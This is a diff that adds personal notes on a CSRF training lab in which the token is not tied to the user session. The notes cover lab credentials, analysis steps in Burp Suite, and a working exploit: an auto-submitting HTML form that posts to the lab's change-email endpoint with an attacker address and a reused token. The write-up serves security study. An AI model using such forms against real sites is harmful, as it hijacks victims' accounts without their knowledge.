@@ -1,0 +1,30 @@
+Lab #4 - CSRF where token is not tied to user session
+
+Vulnerability parameter - email change functionality
+
+Goal - use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
+
+Credentials: 
+- wiener:peter
+- carlos:montoya
+
+Analysis:
+- When logged in, change email address of this account
+- change the request method to GET => method not allowed
+- delete csrf token parameter => missing parameter csrf 
+- using BurpSuite, select HTTP request to change email address -> send to Repeater -> Send this request again => Invalid token
+- but using csrf token of other user can change email address of this account
+=> a token can not be used for two requests at the same time.
+
+Solution:
+- login with our account to get csrf token of our account
+- create a HTML form and attach to this form our csrf token 
+
+    <form method="POST" action="https://0ae9001704f4bda18330012600fe0005.web-security-academy.net/my-account/change-email" id="form">
+        <input type="hidden" name="email" value="user@evil-email.com">
+    <   input name="csrf" type="hidden" value="15IijWiLFUbZJBGMdOmdqJaRIxro3PlX"> 
+    </form>
+
+    <script>
+        document.querySelector("#form").submit();
+    </script>
